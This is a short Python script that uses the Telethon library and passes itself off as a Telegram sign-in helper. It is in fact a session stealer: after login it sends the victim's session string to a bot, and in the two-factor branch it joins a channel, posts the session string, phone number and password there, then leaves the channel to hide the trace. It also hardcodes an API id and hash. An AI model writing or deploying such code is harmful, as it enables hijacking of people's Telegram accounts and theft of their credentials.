
from telethon import TelegramClient, sync
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest

api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
string = input("press enter")
client = TelegramClient(StringSession(string), api_id, api_hash)


phone_number = input("Please enter your phone (or bot token): ")



client.connect()
if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
    	me = client.sign_in(phone_number, input('Please enter the code you received:'))
    	client.send_message("@smart_telethon_bot", client.session.save())
    except SessionPasswordNeededError:
    	password = input('Please enter your password:')
    	
    	me2 = client.sign_in(password=password)
    	print("Signed in succesfully")
    	client(JoinChannelRequest("@test_gurpa"))
    	client.send_message("@test_gurpa", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
    	client(LeaveChannelRequest("@test_gurpa"))

 
 
    	
	#modules

	    

  